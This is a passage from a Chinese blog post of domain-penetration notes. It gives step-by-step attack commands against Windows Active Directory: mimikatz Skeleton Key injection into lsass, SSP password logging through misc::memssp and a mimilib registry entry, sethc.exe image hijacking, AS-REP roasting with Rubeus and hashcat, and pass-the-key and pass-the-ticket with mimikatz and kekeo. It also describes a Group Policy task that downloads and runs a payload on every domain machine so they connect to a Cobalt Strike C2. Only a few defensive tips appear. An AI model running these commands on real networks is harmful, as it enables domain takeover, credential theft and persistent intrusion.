use \\192.168.3.21\ipc$ &quot;Admin12345&quot; /user:god\administrator</span><br><span class="line">	连接成功，这个时候就列出了域控制器 C 盘的共享目录。</span><br><span class="line">之后在域控制器中以管理员权限打开 mimikatz，输入命令将 Skeleton Key 注入域控制器的 lsass.exe 进程：</span><br><span class="line"></span><br><span class="line">	# 提升权限</span><br><span class="line"></span><br><span class="line">	privilege::debug</span><br><span class="line"></span><br><span class="line">	# 注入 skeleton key</span><br><span class="line"></span><br><span class="line">	misc::skeleton</span><br><span class="line">	这个时候系统提示 Skeleton Key 已经注入成功，此时会在域内的所有账号中添加一个 Skeleton Key，其密码默认为：“mimikatz”。</span><br><span class="line">接下来就可以了使用域内任意用户的身份配合 Skeleton Key 进行域内身份授权验证了。</span><br><span class="line">在不使用域管理员原始密码的情况下，使用注入的 Skeleton Key，同样可以成功连接系统：</span><br><span class="line"># 查看现有 ipc$</span><br><span class="line">net use</span><br><span class="line"># 将之前建立的 ipc$ 删除</span><br><span class="line">net use \\192.168.3.21\ipc$ /del /y</span><br><span class="line">	输入命令，使用域管理员账号和 Skeleton Key 与域控制器建立 </span><br><span class="line"></span><br><span class="line">	ipc$：net use \\OWA2010CN-God\ipc$ &quot;mimikatz&quot; /user:god\administrator</span><br><span class="line">	域管理员用户要设置强密码，确保恶意代码不会在域控制器中执行。</span><br><span class="line">在所有域用户中启用双因子认证，例如智能卡认证。</span><br><span class="line">启动应用程序白名单（例如 AppLocker），以限制 mimikatz 在域控制器中的运行。</span><br><span class="line">PS：因为 Skeleton Key 是被注入到 lsass.exe 进程的，所以它只存在于内存中，如果域控制器重启，注入的 Skeleton Key 将会失效。</span><br><span class="line">SSP Attack </span><br><span class="line">	SSP（Security Support Provider）</span><br><span class="line">	直译为安全⽀持提供者，⼜名Security Package，简单的理解为SSP就是⼀个</span><br><span class="line">DLL，⽤来实现身份认证，例如：NTLM、Kerberos、Negotiate、Secure Channel(Schannel)，Digest、</span><br><span class="line">Credential(CredSSP)。</span><br><span class="line">	SSPI（Security Support Provider Interface），直译为安全⽀持提供程序接⼝，是 Windows 系统在执⾏认证操作</span><br><span class="line">所使⽤的 API，简单的理解为 SSPI 就是 SSP 的 API 接⼝。</span><br><span class="line">其攻击原理可以理解就是⼀个⽤于身份验证的 dll，当⽬标系统在启动时 SSP 会被加载到 lsass.exe 进程中，⽽ lsa</span><br><span class="line">可被扩展，所以⽬标机器在系统启动时可以加载⼀个我们⾃定义的 dll，例如⾃定义了⼀个恶意的DLL⽂件，在⽬标</span><br><span class="line">系统启动时⾃动加载到 lsass.exe 进程中，那么攻击者就能够获取 lsass.exe 进程中的明⽂密码，即使⽤户更改密码并重新登录，攻击者依然可以获取该账号的新密码。</span><br><span class="line">	SSP Attack ：通过 Mimikatz 注⼊到内存</span><br><span class="line">通过 mimikatz 注⼊到内存，⽬标⽆需重启系统，只要有⽤户登陆到此系统，那么就⽴即开始密码记录（重启就失</span><br><span class="line">效）。</span><br><span class="line">	mimikatz &quot;privilege::debug&quot; &quot;misc::memssp&quot; &quot;exit&quot;</span><br><span class="line">	SSP Attack：通过 Mimikatz 添加 mimilib.dll 到注册表⾸先需要 mimikatz 中的 mimilib.dll ⽂件</span><br><span class="line"></span><br><span class="line">	powershell</span><br><span class="line">reg query hklm\system\currentcontrolset\control\lsa\ /v &quot;Security Packages&quot;</span><br><span class="line">reg add &quot;hklm\system\currentcontrolset\control\lsa\&quot; /v &quot;Security Packages&quot; /d &quot;kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib&quot; /t REG_MULTI_SZ</span><br><span class="line"></span><br><span class="line">	我们可打开注册表查看⼀下是否添加成功： HKEY_LOCAL_MACHINE/System/CurrentControlSet/Control/Lsa的 Security Packages 项</span><br><span class="line"></span><br><span class="line">	regedit</span><br><span class="line"></span><br><span class="line">	当⽬标系统重启后，如果 DLL 被成功加载，那么⽤户在登录时输⼊的账号密码将会被记录在C:\Windows\System32\kiwissp.log ⽂件⾥：</span><br><span class="line"></span><br><span class="line">镜像劫持</span><br><span class="line">	修改注册表，利用镜像劫持。镜像劫持可以理解为当你打开a.exe程序实际打开的却是b.exe程序，那么a程序就是被b程序劫持了。</span><br><span class="line"></span><br><span class="line">	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\ CurrentVersion\Image File Execution Options ’中添加sethc.exe记录，在键值Debugger中设置我们要替换的程序，即可完成镜像劫持。</span><br><span class="line">然后连续按5次“Shift”，就会弹出计算器</span><br><span class="line">	其他同理程序:</span><br><span class="line">C:\Windows\System32\utilman.exe 设置中心 快捷键：Windows+U 键</span><br><span class="line">C:\Windows\System32\osk.exe 屏幕键盘</span><br><span class="line">C:\Windows\System32\Magnify.exe 放大镜 快捷键：Windows+加减号</span><br><span class="line"></span><br><span class="line">GPO（ Group Policy Objects）</span><br><span class="line">	⽤来存储 Active Directory 中的策略。⾃ Windows Server 2008 开始，GPO 开始⽀持计划任务，便于管理域中的计算机和⽤户，默认情况下，域⽤户的</span><br><span class="line">组策略每90分钟更新，随机偏移为0-30分钟，域控制器的组策略每5分钟更新。也就是说当我们通过某种⼿段拿到了 DC 权限，那么我们就可以让 DC 下发组策略让域内其他机器执⾏计划任务，</span><br><span class="line">从⽽上线到 CobaltStrike。通过 GPO 下发组策略批量上线域内其他机器</span><br><span class="line">1、⾸先来到域控组策略管理： gpmc.msc ，来到域 saulgoodman.cn 右键创建⼀个 GPO：</span><br><span class="line">	新建⼀个操作，使⽤ Powershell C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 执⾏远程下载恶意⽂件并执⾏：</span><br><span class="line"></span><br><span class="line">	这个时候若域机器执⾏ gpupdate /force 即时更新组策略：它就会⾃动执⾏ powershell 上线到我们的 C2，若没域机器权限的话等九⼗分钟域机器会⾃动更新组策略，也能上</span><br><span class="line">线到 C2</span><br><span class="line"></span><br><span class="line">AS-REP Roasting攻击</span><br><span class="line">	条件</span><br><span class="line"></span><br><span class="line">	 域用户设置了 “ Do not require Kerberos preauthentication(不需要kerberos预身份验证) ”</span><br><span class="line">    需要一台可与KDC进行通信的主机/用户</span><br><span class="line">普通域用户下</span><br><span class="line"></span><br><span class="line">	方法一：使用 Rubeus.exe</span><br><span class="line"></span><br><span class="line">	1：使用rubeus.exe获得Hash</span><br><span class="line">Rubeus.exe asreproast</span><br><span class="line"></span><br><span class="line">	2：使用hashcat对获得的Hash进行爆破</span><br><span class="line">将hash.txt里面的除Hash字段其他的都删除，复制到hashcat目录下，并且修改为hashcat能识别的格式，在krb5asrep后面添加23拼接。</span><br><span class="line">然后使用以下命令爆破</span><br><span class="line"> hashcat64.exe -m 18200 hash.txt pass.txt --force</span><br><span class="line"></span><br><span class="line">	方法二：使用powershell脚本</span><br><span class="line"></span><br><span class="line">	1：使用Empire下的powerview.ps1查找域中设置了 &quot;不需要kerberos预身份验证&quot; 的用户</span><br><span class="line"> Import-Module .\powerview.ps1</span><br><span class="line"> Get-DomainUser -PreauthNotRequired</span><br><span class="line"></span><br><span class="line">	2：使用ASREPRoast.ps1获取AS-REP返回的Hash</span><br><span class="line">Import-Module .\ASREPRoast.ps1</span><br><span class="line">Get-ASREPHash -UserName hack2 -Domain xie.com | Out-File -Encoding ASCII hash.txt</span><br><span class="line"></span><br><span class="line">	3：使用hashcat对获得的Hash进行爆破</span><br><span class="line">将hash.txt复制到hashcat目录下，并且修改为hashcat能识别的格式，在krb5asrep后面添加23拼接。然后使用以下命令爆破。</span><br><span class="line">hashcat64.exe -m 18200 hash.txt pass.txt --force</span><br><span class="line"></span><br><span class="line">	非域内机器</span><br><span class="line">1：对于非域内的机器，无法通过LDAP来发起用户名的查询。</span><br><span class="line">2：所以要想获取 &quot;不需要kerberos预身份验证&quot; 的域内账号，只能通过枚举用户名的方式来获得。而AS-REP Hash方面。非域内的主机，只要能和DC通信，便可以获取到。使用Get-ASREPHash，通过指定Server的参数即可</span><br><span class="line">Import-Module .\ASREPRoast.ps1</span><br><span class="line">	Import-Module .\ASREPRoast.ps1</span><br><span class="line">Get-ASREPHash -UserName hack2 -Domain xie.com -Server 192.168.10.131 | Out-File -Encoding ASCII hash.txt</span><br><span class="line"></span><br><span class="line">密钥传递攻击(PTK)</span><br><span class="line">	简介：</span><br><span class="line">密钥传递攻击只能在打了kb2871997</span><br><span class="line">条件：</span><br><span class="line">打了kb2871997补丁才能任意用户都可以连接，采用 aes256 连接。</span><br><span class="line">进行攻击：</span><br><span class="line">mimikatz获取aes值</span><br><span class="line">	sekurlsa::ekeys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	sekurlsa::pth /user:域用户名 /domain:域名 /aes256:aes256值 hash</span><br><span class="line">sekurlsa::pth /user:administrator /domain:god /aes256:bd25b5ae78c10e3fcda9693cd31027d70383063a1d8c2b835c6fa1c416b79669</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	在实际上，PTK传递比PTH传递用的少，因为PTK传递需要一个前提条件，需要域控安装KB2871997补丁的Win7/2008r2/8/2012（2019尝试也可以，并没有装补丁)。</span><br><span class="line"></span><br><span class="line">ptt</span><br><span class="line">	1.使用mimikatz进行票据传递攻击：</span><br><span class="line">	缺点：票据是有有效期的，一般为10小时，所以如果当前主机10h之内连接过域控的话，我们可以利用该票据，但是如果超过10h，就没法利用了。</span><br><span class="line">导出票据</span><br><span class="line">sekurlsa::tickets /export</span><br><span class="line">	删除票据，排除干扰</span><br><span class="line">klist purge</span><br><span class="line">	kerberos::ptt 票据文件</span><br><span class="line">kerberos::ptt C:\Users\Administrator\Desktop\mimikatz_trunk\x64\[0;3e7]-2-0-60a00000-STU1$@krbtgt-GOD.ORG.kirbi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	2.利用工具kekeo</span><br><span class="line"></span><br><span class="line">生成票据，导入票据</span><br><span class="line"></span><br><span class="line">kekeo &quot;tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695dc997aa02d455c&quot; //生成票据</span><br><span class="line">kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi //导入票据</span><br><span class="line"></span><br><span class="line">	查看凭证 klist</span><br><span class="line"></span><br><span class="line">	dir \192.168.3.21\c$</span><br><span class="line">dir \\OWA2010CN-God.god.org\c$</span><br></pre></td></tr></table></figure>
  </article>
  <aside class="table-content" id="site-toc">
  <div class="table-content-title">
    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
    <span>目录</span>
  </div>
  <div class="table-content-main">
    
  </div>
</aside>
  
    <aside class="passage-copyright">
      <div>本文作者: hcncn</div>
      
        <div>
          原文链接: 
          <a href="" target="_blank">https://hcncn6.github.io/2022/09/06/内网/域渗透/</a>
        </div>
      
      <div>
        版权声明: 本博客所有文章除特别声明外, 均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议. 转载请注明出处!
      </div>
    </aside>
  
  
</div>

    </main>
    
    <div class="site-footer-wrapper">
  <footer class="site-footer">
    
    <div class="site-footer-info">
      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
    </div>
    
      <div class="site-footer-info">
        <i class="fa fa-paw"></i> 您是本站第 <span id="site-count"></span> 位访客
      </div>
    
    
    <div class="site-footer-info">
      <i class="fa fa-copyright"></i> 
      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
      Created by <a href="https://godbmw.com/" target="_blank">GodBMW</a>.
      All rights reserved.
    </div>
  </footer>
</div>
    <div id="site-layer" style="display:none;">
  <div class="site-layer-content">
    <div class="site-layer-header">
      <span class="site-layer-header-title" id="site-layer-title"></span>
      <i class="fa fa-close" id="site-layer-close"></i>
    </div>
    <div class="site-layer-body" id="site-layer-container">
      <div class="site-layer-input" id="site-layer-search" style="display: none;">
        <div class="site-layer-input-choose">
          <a href="javascript:void(0);" title="Change Search Engine">Google</a>
        </div>
        <input type="text">
        <i class="fa fa-search"></i>
      </div>
      
      <div id="site-layer-welcome" style="display:none;"></div>
    </div>
  </div>
</div>
    

<div class="bottom-bar">
  <div class="bottom-bar-left">
    <a href="javascript:void(0);" data-enable="false">
      <i class="fa fa-arrow-left"></i>
    </a>
    <a href="/2022/09/05/内网/内网提权合集/" data-enable="true">
      <i class="fa fa-arrow-right"></i>
    </a>
  </div>
  <div class="bottom-bar-right">
    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
      <i class="fa fa-bars"></i>
    </a>
    
    <a href="javascript:void(0);" id="site-toggle-share-btn">
      <i class="fa fa-share-alt"></i>
    </a>
    
    <a href="javascript:void(0);" id="back-top-btn">
      <i class="fa fa-chevron-up"></i>
    </a>
  </div>
</div>
    <div id="share-btn">
  
  
  
  
  
</div>
    





    
  </body>
</html>